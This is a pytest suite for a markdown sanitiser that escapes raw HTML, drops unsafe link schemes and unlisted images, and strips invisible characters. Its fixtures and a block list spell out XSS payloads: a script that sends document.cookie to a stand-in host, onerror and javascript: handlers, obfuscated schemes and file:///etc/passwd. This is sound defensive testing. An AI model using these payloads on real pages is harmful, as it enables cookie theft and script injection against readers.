"""Cleaning an article's markdown: one canonical form, nothing in it that runs or reaches out, each removal listed."""

from __future__ import annotations

import json
import os
import random
import re
import sqlite3
from collections.abc import Iterator
from pathlib import Path

import pytest
from markdown_it import MarkdownIt
from markdown_it.token import Token

from cerebro.clean import INVISIBLE, Cleaned, _key, _kind, clean

OK_IMAGE = "https://img.example/chart.png"


def cleaned(text: str, **kw: object) -> Cleaned:
    out = clean(text, **kw)  # type: ignore[arg-type]
    assert clean(out.text, **kw).text == out.text  # type: ignore[arg-type]
    return out


def said(text: str, **kw: object) -> str:
    return cleaned(text, **kw).text


# -- raw HTML: every `<` that could open it is written `&lt;`, so the markup shows as written and runs nowhere


@pytest.mark.parametrize(("text", "want"), [
    ("<script>fetch('https://x.example/'+document.cookie)</script>\n\nAcme shipped [^fact_1].",
     "&lt;script>fetch('https://x.example/'+document.cookie)&lt;/script>\n\nAcme shipped [^fact_1].\n"),
    ("<iframe src=https://x.example></iframe>\n\nAcme shipped.",
     "&lt;iframe src=https://x.example>&lt;/iframe>\n\nAcme shipped.\n"),
    ("<details><summary>more</summary>Acme shipped [^fact_1].</details>\n\nNext.",
     "&lt;details>&lt;summary>more&lt;/summary>Acme shipped [^fact_1].&lt;/details>\n\nNext.\n"),
    ("<div\nclass=x>\nAcme shipped.\n</div>\n\nNext.", "&lt;div\nclass=x>\nAcme shipped.\n&lt;/div>\n\nNext.\n"),
    ("<!-- a note -->\n\nAcme shipped.", "&lt;!-- a note -->\n\nAcme shipped.\n"),
])
def test_a_block_of_html_shows_as_written_and_keeps_every_word(text: str, want: str) -> None:
    out = cleaned(text)
    assert out.text == want
    assert out.removed and all(line.startswith(("escaped raw HTML", "escaped an HTML comment")) for line in out.removed)


@pytest.mark.parametrize(("text", "want"), [
    ("Acme <b>shipped</b> [^fact_1].", "Acme &lt;b>shipped&lt;/b> [^fact_1].\n"),
    ("Acme shipped <img src=x onerror=alert(1)> today.", "Acme shipped &lt;img src=x onerror=alert(1)> today.\n"),
    ('See <a href="javascript:alert(1)">the plan</a>.', 'See &lt;a href="javascript:alert(1)">the plan&lt;/a>.\n'),
    ("Acme <span\nonmouseover=alert(1)>shipped</span> today.", "Acme &lt;span\nonmouseover=alert(1)>shipped&lt;/span> today.\n"),
    ("A cell<br>two lines.", "A cell&lt;br>two lines.\n"),
    ("Acme <?php echo 1 ?> shipped <![CDATA[x]]>.", "Acme &lt;?php echo 1 ?> shipped &lt;\\![CDATA[x]]>.\n"),
    ("When 3 < 4 and a <= b.", "When 3 < 4 and a <= b.\n"),
])
def test_an_inline_tag_shows_as_written_and_a_lone_less_than_stays(text: str, want: str) -> None:
    assert said(text) == want


def test_a_tag_that_does_not_close_shows_as_written() -> None:
    out = cleaned("Acme <img src=x onerror=alert(1) shipped.")
    assert out.text == "Acme &lt;img src=x onerror=alert(1) shipped.\n"
    assert out.removed == [('escaped raw HTML "<img src=x onerror=alert(1) shipped." so that it shows as written: a '
                            "browser would run it")]


# -- link targets


BAD_LINKS = [
    "javascript:alert(1)", "JaVaScRiPt:alert(1)", "java\tscript:alert(1)", "java\x01script:alert(1)",
    "&#106;avascript:alert(1)", "&#x6A;avascript&colon;alert(1)", " javascript:alert(1)", "<javascript:alert(1)>",
    "data:text/html;base64,PHNjcmlwdD4=", "vbscript:msgbox(1)", "file:///etc/passwd", "ftp://files.example/a",
]


@pytest.mark.parametrize("target", BAD_LINKS)
def test_a_link_to_a_scheme_outside_http_and_mailto_keeps_its_words(target: str) -> None:
    out = cleaned(f"Read [the plan]({target}) now.")
    assert out.text == "Read the plan now.\n"
    assert any(line.startswith('removed the target of the link "the plan"') for line in out.removed)


def test_a_link_with_spaces_inside_its_scheme_loses_its_target_too() -> None:
    out = cleaned("Read [the plan](JaVa ScRiPt:alert(1)) now.")
    assert out.text == "Read the plan now.\n"


def test_a_reference_link_whose_definition_has_a_bad_scheme_keeps_its_words() -> None:
    out = cleaned("Read [the plan][p] and [p] now.\n\n[p]: javascript:alert(1)")
    assert out.text == "Read the plan and p now.\n"


def test_a_reference_link_to_a_good_target_is_written_inline() -> None:
    assert said('Read [the plan][p] now.\n\n[P]: https://plans.example/a "Plan"') == \
        'Read [the plan](https://plans.example/a "Plan") now.\n'


def test_an_autolink_to_a_bad_scheme_becomes_its_words() -> None:
    out = cleaned("Open <javascript:alert(1)> or <https://plans.example/a> or <ops@acme.example>.")
    assert out.text == "Open javascript:alert(1) or <https://plans.example/a> or <ops@acme.example>.\n"
    assert out.removed == [('removed the target of a link to "javascript:alert(1)": a javascript: address can run '
                            "code or reach a reader's machine")]


def test_a_link_inside_an_image_is_checked() -> None:
    assert said(f"![a [b](vbscript:x) c]({OK_IMAGE})", images=[OK_IMAGE]) == f"![a b c]({OK_IMAGE})\n"


def test_bidirectional_marks_around_a_link_go_and_the_link_is_checked() -> None:
    out = cleaned("Read \u202e[the plan](javascript:alert(1))\u202c and \u2066[notes](../calls/kickoff.md)\u2069.")
    assert out.text == "Read the plan and [notes](../calls/kickoff.md).\n"
    assert out.removed[0] == "removed 4 control or invisible characters: they hide or reorder what a reader sees"


def test_a_stray_link_tail_to_a_bad_scheme_is_escaped() -> None:
    assert said("Read \\[the plan](javascript:alert(1)).") == "Read \\[the plan\\](javascript:alert(1)).\n"


# -- images


def test_an_image_whose_address_was_not_handed_in_becomes_its_words() -> None:
    out = cleaned("Acme shipped ![the chart](https://x.example/?q=acme-terms) [^fact_1].", images=[OK_IMAGE])
    assert out.text == "Acme shipped the chart [^fact_1].\n"
    assert out.removed == [('removed the image "https://x.example/?q=acme-terms", keeping its words: an image '
                            "loads its address as the article is shown, and no cited evidence holds it")]


def test_an_image_whose_address_was_handed_in_stays() -> None:
    assert said(f"![the chart]({OK_IMAGE})", images=[OK_IMAGE]) == f"![the chart]({OK_IMAGE})\n"


def test_an_image_by_reference_and_a_relative_image_go_with_no_list() -> None:
    assert said("![chart][c] and ![logo](../logo.png)\n\n[c]: https://x.example/c.png") == "chart and logo\n"


def test_an_image_inside_a_link_goes_and_the_link_stays() -> None:
    assert said("[![logo](https://x.example/l.png)](https://acme.example)") == "[logo](https://acme.example)\n"


def test_an_image_in_a_table_cell_becomes_its_words() -> None:
    assert said("| Account | Logo |\n| --- | --- |\n| Acme | ![acme](https://x.example/a.png) |") == \
        "| Account | Logo |\n| --- | --- |\n| Acme | acme |\n"


def test_an_escaped_bang_is_no_image() -> None:
    assert said("Wow\\![the plan](https://plans.example/a)") == "Wow\\![the plan](https://plans.example/a)\n"


# -- outside links are reported, never removed


def test_an_outside_link_no_evidence_holds_is_noted_and_kept() -> None:
    text = "See [the plan](https://plans.example/a) and [the deck](https://decks.example/b) and www.acme.example."
    out = cleaned(text, links=["https://plans.example/a/"])
    assert out.text == text + "\n"
    assert out.removed == []
    assert out.noted == ["kept the link to https://decks.example/b: no cited evidence holds that address",
                         "kept the link to www.acme.example.: no cited evidence holds that address"]


def test_with_no_list_of_links_nothing_is_noted() -> None:
    assert cleaned("See [the plan](https://plans.example/a).").noted == []


# -- footnotes


def test_a_footnote_definition_the_text_writes_goes() -> None:
    out = cleaned('Acme shipped [^fact_1].\n\n[^fact_1]: local/a.md "a made-up quote"\n    and more of it\n\nNext.')
    assert out.text == "Acme shipped [^fact_1].\n\nNext.\n"
    assert out.removed == [("removed the footnote [^fact_1] the text defines: each citation's footnote is written "
                            "apart, from its evidence")]


def test_a_footnote_definition_under_a_paragraph_goes_with_its_lazy_lines() -> None:
    assert said("Acme shipped [^f_1].\n[^f_1]: made up\nstill made up\n\n- Next") == "Acme shipped [^f_1].\n\n- Next\n"


# -- structure


def test_front_matter_at_the_top_goes() -> None:
    out = cleaned("---\nlevel: high\nowner: Nessa Torvik\n---\nAcme shipped [^fact_1].")
    assert out.text == "Acme shipped [^fact_1].\n"
    assert out.removed[0].startswith('removed a block of front matter at the top of the text, "level: high owner: '
                                     'Nessa Torvik"')


def test_toml_front_matter_at_the_top_goes_and_a_lone_mark_is_escaped() -> None:
    assert said("+++\nlevel = 'high'\n+++\nAcme shipped.") == "Acme shipped.\n"
    assert said("+++\n\nAcme shipped.") == "\\+++\n\nAcme shipped.\n"


def test_a_rule_at_the_top_is_written_so_it_reads_as_no_front_matter() -> None:
    assert said("---\n\nAcme shipped.\n\n---\n\nNext.") == "***\n\nAcme shipped.\n\n***\n\nNext.\n"


def test_an_underlined_heading_becomes_a_hash_heading() -> None:
    assert said("Acme\n====\n\nRenewal\nterms\n-------\n\nText.") == "## Acme\n\n## Renewal terms\n\nText.\n"


def test_a_heading_at_the_parts_own_level_moves_just_below_it_and_the_rest_stay() -> None:
    """Only a heading at the part's own level is demoted, and the others are left."""
    out = cleaned("# Acme\n\nText.\n\n## Terms\n\n#### Fine print")
    assert out.text == "## Acme\n\nText.\n\n## Terms\n\n#### Fine print\n"
    assert out.removed[0] == ('moved the heading "Acme" from level 1 to level 2: only the part\'s own heading sits at '
                              "level 1 or above")


def test_a_part_under_its_own_heading_has_its_headings_moved_below_it() -> None:
    assert said("## Terms\n\nText.\n\n### Fine print", top=2) == "### Terms\n\nText.\n\n### Fine print\n"
    assert said("### Terms\n\nText.", top=2) == "### Terms\n\nText.\n"
    assert said("# A\n\n###### B", top=1) == "## A\n\n###### B\n"


def test_an_unclosed_fence_is_closed_where_it_ends() -> None:
    assert said("Acme shipped.\n\n```\nlog line [^fact_1]") == "Acme shipped.\n\n```\nlog line [^fact_1]\n```\n"
    assert said("> ```yaml\n> - name: Acme") == "> ```yaml\n> - name: Acme\n> ```\n"


def test_a_fence_info_that_a_builder_runs_goes() -> None:
    out = cleaned("```{=html}\n<script>x</script>\n```\n\n```python title=\"x\"\nprint(1)\n```")
    assert out.text == "```\n<script>x</script>\n```\n\n```python\nprint(1)\n```\n"
    assert out.removed == ['removed the info "{=html}" of a code fence: a site builder may run or embed what it names',
                           ('removed the info "python title="x"" of a code fence: a site builder may run or embed what '
                            "it names")]


def test_a_line_that_opens_with_a_tag_never_becomes_a_heading() -> None:
    assert said("Acme shipped\n<b># 1</b> in the region.") == "Acme shipped\n&lt;b># 1&lt;/b> in the region.\n"


# -- characters


def test_control_and_invisible_characters_go() -> None:
    text = "Acme\u200b sh\u00adipped\x07 \ufeff[^fact_1]\U000e0041\U000e0042."
    out = cleaned(text)
    assert out.text == "Acme shipped [^fact_1].\n"
    assert out.removed == ["removed 6 control or invisible characters: they hide or reorder what a reader sees"]


def test_an_entity_that_writes_an_invisible_character_goes() -> None:
    out = cleaned("Acme&#8238; shipped&ZeroWidthSpace; &amp; signed &#169;.")
    assert out.text == "Acme shipped &amp; signed &#169;.\n"
    assert len(out.removed) == 2


def test_an_emoji_joiner_stays() -> None:
    family = "\U0001f468\u200d\U0001f469\u200d\U0001f467"
    assert said(f"Team {family} here.") == f"Team {family} here.\n"


def test_whitespace_takes_one_form() -> None:
    text = "\r\n\r\nAcme\u00a0shipped\tit.  \r\nNext line\rthird\r\n\r\n\r\n\r\nLast   \n\n\n"
    assert said(text) == "Acme shipped    it.\\\nNext line\nthird\n\nLast\n"
    assert cleaned(text).removed == []


def test_text_is_put_in_nfc() -> None:
    assert said("Cafe\u0301 Ruiz") == "Caf\u00e9 Ruiz\n"


# -- templates and MDX: not renderers an article is promised to, so their syntax lands as written


@pytest.mark.parametrize("text", ["Price {{ site.secret }} now.", "Run {% include x.html %} now.", "Pay ${HOME} now.",
                                  "Run <% system('x') %> now.", "import Chart from './chart.js'", "export const a = 1",
                                  "Write `{{ name }}` here.", "[the plan](https://plans.example/{{x}})"])
def test_template_and_mdx_syntax_lands_as_written(text: str) -> None:
    out = cleaned(text)
    assert out.text == text + "\n" and out.removed == out.noted == []


# -- tables


def test_a_ragged_table_is_evened() -> None:
    out = cleaned("| Name | Stage |\n|---|:-:|\n| Acme |\n| Kestrel | won | extra [^f_1] |")
    assert out.text == "| Name | Stage |\n| --- | :-: |\n| Acme |  |\n| Kestrel | won |\n"
    assert out.removed == [('removed 1 cell(s) past the last column of a table, "extra [^f_1]": a renderer does not '
                            "show them")]


def test_a_table_with_an_escaped_pipe_counts_its_cells_right() -> None:
    text = "| Term | Value |\n| --- | --- |\n| a \\| b | 1 |"
    assert said(text) == text + "\n"


# -- what stays exactly as it is


KEPT = [
    "Acme shipped [^fact_01m7qx7m1k5tx5xbxa] and signed [^fact_1][^fact_2] [^note-3].",
    "x < y, a_b_c, $18,000, {draft}, 2*3*4, a > b and 5 <= 6.",
    "Use `<script>` or `{x}` or ``a ` b`` as code.",
    "See [Nessa Torvik](../people/nessa-torvik.md) and [Accounts](../accounts/) and [top](#terms).",
    "Mail [ops](mailto:ops@acme.example) or open [the plan](https://plans.example/a).",
    ("| Account | Stage | Amount | Close date |\n| --- | --- | --- | --- |\n"
     "| [Kestrel Foods](../accounts/kestrel-foods.md) | — | — | — |"),
    "Lead:\n\n```yaml\n- person: Omar Haddad\n  role: decides\n  fact: \"[^fact_01m7qkxcgx0px96j5k]\"\n```",
    ("- **Brightwater Logistics, pilot.** Sam Okoye sent the plan, priced at $18,000 [^fact_1].\n"
     "- **Kestrel Foods.** Omar Haddad has a budget of $40,000 [^fact_2]."),
    "1. First\n2. Second\n\n> A quote with *stress* and __strong__.",
    "Line one\\\nline two.",
    "Prices: 10 * 3 = 30, a_b and *c*; {x: 1}; [not a link]; (paren); 50% of $5.",
]


@pytest.mark.parametrize("text", KEPT)
def test_this_stays_exactly_as_it_is(text: str) -> None:
    out = cleaned(text)
    assert out.text == text + "\n"
    assert out.removed == [] and out.noted == []


def test_a_yaml_block_stays_byte_for_byte_inside_the_fence() -> None:
    block = "```yaml\nitems:\n  - name: \"A\tcme\"   \n    fact: [^f_1]\n    note: '<b>{{x}}</b> ${y}'\n\n\n```"
    out = cleaned(f"Lead:\n\n{block}\n\nAfter.")
    assert out.text == f"Lead:\n\n{block}\n\nAfter.\n"
    assert out.removed == []


def test_bullets_take_one_mark_and_two_lists_stay_two() -> None:
    assert said("* one\n* two\n\n+ three\n\nText.\n\n* four") == "- one\n- two\n\n* three\n\nText.\n\n- four\n"
    assert said("> * one\n>   + two") == "> - one\n>   - two\n"


# -- every rule's result holds for any input, and a second clean changes nothing

MD = MarkdownIt("commonmark").enable("table")
MD.validateLink = lambda url: True

PARTS = [
    "Acme signed", "[^fact_01abc]", "x < y", "a_b_c", "$18,000", "{draft}", "2*3", "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "<b>", "</b>", "<div>", "</div>", "<!-- c -->", "<a href='javascript:x'>", "</a>",
    "[t](javascript:alert(1))", "[t](JaVa ScRiPt:x)", "[t](&#106;avascript:x)", "[t](data:text/html,x)",
    "[t](https://ok.example)", "[t](../people/jane.md)", "![alt](https://evil.example/?q=s)", f"![ok]({OK_IMAGE})",
    f"![a [b](vbscript:x)]({OK_IMAGE})", "[![i](https://evil.example/p)](https://ok.example)", "[r]", "[t][r]",
    "[r]: javascript:alert(1)", '[r]: https://ok.example "T"', "[^f_1]: made up", "---", "+++", "===", "# H1",
    "## H2", "### H3", "```", "```yaml", "~~~", "```{=html}", "    code", "| a | b |", "|---|---|", "| 1 |",
    "| 1 | 2 | 3 |", "{{ x }}", "{% if %}", "{{< sc >}}", "<% e %>", "${HOME}", "`{{ c }}`", "``a`b``",
    "import X from 'y'", "export const a = 1", "<Widget />", "\u202e", "\u200b", "\x07", "&#8238;", "\u00a0", "\t",
    "\r\n", "\r", "* item", "+ item", "- item", "1. item", "> quote", "\\", "\\<b>", "<https://ok.example/x>",
    "<javascript:x>", "<a@b.co>", "www.example.com", "]", "[", "(", ")", "!", "<", ">", "&amp;", "&", "e\u0301", "<br>",
    "<b\nonclick=x>", "[x](<javascript:y>)", '[x](javascript:a(1) "t")', "<?php x ?>", "<![CDATA[x]]>",
    "<!DOCTYPE x>", "title: x", "  ", "\n", "\n\n", "\n\n\n",
]
JOINS = [" ", "", "\n", "\n\n", "\n> ", "\n- ", "  \n", "\n    ", "\n  "]


def _generated(seed: int, count: int) -> Iterator[str]:
    rng = random.Random(seed)
    for _ in range(count):
        yield "".join(rng.choice(PARTS) + rng.choice(JOINS) for _ in range(rng.randint(1, 14)))


def _walk(tokens: list[Token]) -> Iterator[Token]:
    for tok in tokens:
        yield tok
        if tok.children:
            yield from _walk(tok.children)


def _code_lines(tokens: list[Token]) -> set[int]:
    return {n for tok in tokens if tok.type in ("fence", "code_block") and tok.map for n in range(*tok.map)}


def _without_code_spans(text: str) -> str:
    out, i = [], 0
    while i < len(text):
        if text[i] == "\\" and i + 1 < len(text):
            out.append("##")
            i += 2
            continue
        if text[i] == "`":
            run = len(text[i:]) - len(text[i:].lstrip("`"))
            k, close = i + run, None
            while (k := text.find("`" * run, k)) != -1:
                length = len(text[k:]) - len(text[k:].lstrip("`"))
                if length == run:
                    close = k + run
                    break
                k += length
            out.append("`" * run if close is None else "")
            i = i + run if close is None else close
            continue
        out.append(text[i])
        i += 1
    return "".join(out)


def problems(text: str, top: int = 1) -> list[str]:
    """What in cleaned `text` breaks a rule, as a renderer that checks nothing would read it."""
    found = []
    tokens = MD.parse(text, {})
    for tok in _walk(tokens):
        if tok.type in ("html_block", "html_inline"):
            found.append(f"raw HTML {tok.content!r}")
        if tok.type == "link_open" and _kind(tok.attrGet("href") or "")[0] == "bad":  # type: ignore[arg-type]
            found.append(f"link to {tok.attrGet('href')}")
        if tok.type == "image" and _key(str(tok.attrGet("src"))) != _key(OK_IMAGE):
            found.append(f"image of {tok.attrGet('src')}")
        if tok.type == "heading_open" and int(tok.tag[1]) <= top:
            found.append(f"heading {tok.tag}")
    code = _code_lines(tokens)
    prose = _without_code_spans("\n".join(line for n, line in enumerate(text.split("\n")) if n not in code))
    found += [f"tail to {m.group(1)}" for m in re.finditer(r"\]\(\s*<?([^)\s>]*)", prose) if _kind(m.group(1))[0] == "bad"]
    angle = re.sub(r"<[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*>|<[^\s<>@]+@[^\s<>]+>", "\x00", prose)
    found += ["a tag's opening" for _ in re.finditer(r"<[A-Za-z/!?]", angle)]
    found += ["an invisible character" for _ in INVISIBLE.finditer(prose.replace("\u200d", ""))]
    found += [f"footnote {line}" for n, line in enumerate(text.split("\n"))
              if n not in code and re.match(r"^[ >]*\[\^[^\]\s]+\]:", line)]
    if text.split("\n", 1)[0].rstrip() in ("---", "+++"):
        found.append("front matter")
    if text and (not text.endswith("\n") or text.endswith("\n\n")):
        found.append("not one final newline")
    return found


@pytest.mark.parametrize("seed", range(4))
def test_any_input_comes_out_clean_and_stays_as_it_is_cleaned_again(seed: int) -> None:
    for text in _generated(seed, 1000):
        top = 1 + seed % 2
        out = clean(text, images=[OK_IMAGE], top=top)
        assert problems(out.text, top) == [], (text, out.text)
        assert clean(out.text, images=[OK_IMAGE], top=top).text == out.text, (text, out.text)


def test_one_long_line_and_a_long_article_are_cleaned() -> None:
    line = "Acme shipped [^fact_1] [the plan](javascript:x) <b>bold</b> " * 2000
    out = clean(line)
    assert "javascript" not in out.text and "<b>" not in out.text
    article = ("## Part\n\nAcme shipped [^fact_1] with [t](../a.md).\n\n| a | b |\n| --- | --- |\n| 1 | 2 |\n\n") * 500
    assert clean(article).text == clean(clean(article).text).text


def test_text_built_to_be_slow_is_cleaned_in_time() -> None:
    assert clean("[" * 20000 + "x").text == "[" * 20000 + "x\n"
    assert clean("<a " * 5000).text.startswith("&lt;a")
    assert "javascript" not in clean("[a](" * 4000 + "[b](javascript:x)").text
    assert clean("![a](" * 4000).removed == []


# -- articles: only whitespace and marks may move, and nothing is removed

ARTICLES = [
    ("What changed on the 17 November call: the Tacoma clinic's staff training is done [^fact_01m7qx7m1k5tx5xbxa], "
     "and the second clinic's network upgrade slips to January 2027 [^fact_01m7qx7m1k7ytyx6sq]. Watch: the second "
     "clinic's go-live moves with its slipped January network upgrade [^fact_01m7qx7m1k7ytyx6sq]."),
    "- [Accounts](../accounts/) (4 articles)\n- [Calls](../calls/) (1 article)\n- [Digests](./) (1 article)",
    ("- [Grace Liu](../people/grace-liu.md) — Grace Liu is the director of IT at Novaline Health "
     "[^fact_01m7qx85jd7abkrfnr] [^fact_01m7qx85jdmgmzg3hm]."),
    ("Kestrel Foods is comparing us with one other vendor [^fact_01m7qx7bbayk9a6sjk].\n\nOmar Haddad said the final "
     "call is his [^fact_01m7qx8037bbxwj6yx].\n\n"),
    ("Omar Haddad is the CFO of Kestrel Foods [^fact_01m7qkxcgx0px96j5k].\n\n```yaml\n- person: Omar Haddad\n"
     "  role: decides\n  fact: \"[^fact_01m7qkxcgx0px96j5k]\"\n```"),
]


def _stored() -> list[str]:
    """Every part a workspace named by CEREBRO_CLEAN_CORPUS holds, a `cerebro.sqlite` path or several split by `:`."""
    texts: list[str] = []
    for path in filter(None, os.environ.get("CEREBRO_CLEAN_CORPUS", "").split(":")):
        try:
            rows = sqlite3.connect(f"file:{Path(path)}?mode=ro", uri=True).execute("select body from compilations")
            texts += [json.loads(body)["text"] for (body,) in rows]
        except sqlite3.DatabaseError:  # a store with no such table, or one left half written
            continue
    return texts


def _marks_and_spaces_out(text: str) -> str:
    return re.sub(r"[\s#*\-_>|\\]", "", text)


@pytest.mark.parametrize("text", ARTICLES)
def test_an_article_moves_only_in_whitespace_and_marks(text: str) -> None:
    out = cleaned(text)
    assert _marks_and_spaces_out(out.text) == _marks_and_spaces_out(text)
    assert out.removed == [] and out.noted == []


def test_every_article_of_a_named_workspace_is_clean_and_stays_so() -> None:
    texts = _stored()
    if not texts:
        pytest.skip("no workspace named in CEREBRO_CLEAN_CORPUS")
    for text in texts:
        out = clean(text)
        assert out.removed == [], (text, out.removed)
        assert _marks_and_spaces_out(out.text) == _marks_and_spaces_out(text)
        assert clean(out.text).text == out.text
